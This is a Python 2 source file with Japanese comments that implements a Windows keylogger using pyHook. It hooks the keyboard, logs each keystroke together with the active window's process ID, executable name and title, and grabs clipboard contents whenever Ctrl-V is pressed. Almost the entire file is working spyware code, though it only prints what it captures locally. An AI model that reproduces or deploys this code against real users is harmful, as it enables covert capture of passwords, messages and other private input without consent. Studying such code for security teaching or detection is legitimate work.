# -*- coding: utf-8 -*-
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

def get_current_process():

    # 操作中のウィンドウへのハンドルを取得
    hwnd = user32.GetForegroundWindow()

    # プロセスIDの特定
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 特定したプロセスIDの保存
    process_id = "%d" % pid.value

    # 実行ファイル名の取得
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # ウィンドウのタイトルバーの文字列を取得
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # ヘッダーの出力
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print
  

    # ハンドルのクローズ
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):

    global current_window   

    # 操作中のウィンドウが変わったか確認
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # 標準的なキーが押下されたかチェック
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        # [Ctrl-V]が押下されたならば、クリップボードのデータを取得
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,

    # 登録済みの次のフックに処理を渡す
    return True

# フックマネージャーの作成と登録
kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke

# フックの登録と実行を継続
kl.HookKeyboard()
pythoncom.PumpMessages()
